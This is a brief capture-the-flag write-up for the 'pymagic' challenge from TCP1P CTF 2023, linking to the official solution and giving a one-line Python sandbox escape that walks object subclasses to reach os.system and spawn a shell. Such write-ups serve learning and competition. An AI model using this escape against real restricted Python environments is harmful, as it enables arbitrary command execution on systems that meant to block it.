# pymagic

Do you believe in PEP's magic?

## Solution

https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Misc/PyMagic/writeup

PEP560?

```py
_.__class__.__subclasses__(_.__base__)[140].__init__.__globals__['system']('sh')
```
